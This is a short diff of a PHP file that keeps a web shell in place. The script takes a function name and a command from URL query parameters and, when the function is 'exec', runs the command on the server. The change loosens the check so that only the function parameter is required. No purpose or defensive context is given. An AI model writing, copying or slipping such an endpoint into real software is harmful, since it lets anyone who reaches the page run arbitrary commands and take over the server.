@@ -1,6 +1,6 @@
 <?php
 
-if($_GET["function"] && $_GET["cmd"]) {
+if($_GET["function"]) {
 	if($_GET["function"] == "exec") {
 		$out = array();
 		$_GET["function"]($_GET['cmd'], $out);
